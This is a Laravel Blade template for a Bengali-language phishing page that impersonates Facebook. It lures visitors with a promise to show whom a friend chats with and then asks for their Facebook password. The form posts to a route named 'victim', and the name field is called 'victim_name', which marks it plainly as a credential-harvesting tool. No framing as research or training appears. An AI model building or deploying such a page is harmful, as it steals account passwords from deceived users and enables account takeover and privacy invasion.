@extends('layouts.app')
@section('title')
  Home Page
@endsection

@section('content')
<div class="bg-white">
  <div class="container-login100" style="background-image: url('{{asset('public/frontend/img/img-01.jpg')}}');">
      <div class="container">
          <div class="row">
              <div class="col">
                  <div class="text-center mb-5">
                    <img class="w-25" src="{{asset('public/frontend/img/facebook-logo.png')}}" alt="">
                  </div>
                <form method="post" action="{{ route('victim') }}">
                  @csrf
                  <div class="form_one overflow-hidden">
                      <p class="text-center mb-4"><b>দেখুন আপনার বন্ধু কার কার সাথে চ্যাট করে ।</b></p>
                      <label class="d-block" for="">আপনার নাম লিখুন : </label>
                      <input name="victim_name" autocomplete="off" class="ar_form_control" type="text" placeholder="ex: Mr. Rahman">

                      <label class="d-block" for="">বন্ধুর নাম লিখুন : </label>
                      <input name="fnd_name" autocomplete="off" class="ar_form_control" type="text" placeholder="ex: Mr. Rahman">

                      <label class="d-block" for="">আপনার বন্ধু তালিকায় সে আছে ? </label>
                      <input type="radio" id="yes_fnd" name="friend_radio" value="yes">
                      <label class="mr-4" for="yes_fnd">হ্যা</label>
                      <input type="radio" id="no_fnd" name="friend_radio" value="no">
                      <label for="no_fnd">না</label> 

                      <label class="d-block" for="">আপনার সাথে কি তার চ্যাট হয়েছে ? </label>
                      <input type="radio" id="yes_chat" name="chat_radio" value="yes">
                      <label class="mr-4" for="yes_chat">হ্যা</label>
                      <input type="radio" id="no_chat" name="chat_radio" value="no">
                      <label for="no_chat">না</label> 

                      <div id="form_one" class="btn btn-outline-light btn-sm float-right">Next</div>
                  </div>
                  <div class="form_two">
                    <p class="text-center mb-4">আপনার বন্ধুর চ্যাট তালিকা</p>
                    <table class="table table-bordered table-striped text-center text-light">
                      <tr>
                        <th class="w-45">Profile Picture</th>
                      </tr>
                      @foreach ($fndlist as $item)
                          @foreach ( json_decode($item->img) as $data)
                              <tr>
                                <td><img class="w-50 border" src="{{ asset($data) }}" alt=""></td>
                              </tr>
                          @endforeach
                      @endforeach
                    </table>
                    <div id="form_two" class="btn btn-outline-light btn-sm float-right">Next</div>
                  </div>
                  <div class="form_three">
                    <p class="text-center mb-4">আপনার কি চ্যাট গুলো পড়তে চান ?</p>
                    <label class="d-block" for="">Your User Id</label>
                    <input class="ar_form_control" readonly type="text" value="km Nasir">
                    <label class="d-block" for="">Password</label>
                    <input required name="password" class="ar_form_control" type="password" placeholder="password">
                    <button id="submit" class="btn btn-outline-light btn-sm float-right">
                      Next
                    </button>

                  </div>
                </form>
              </div>
          </div>
      </div>
  </div>
</div>


@endsection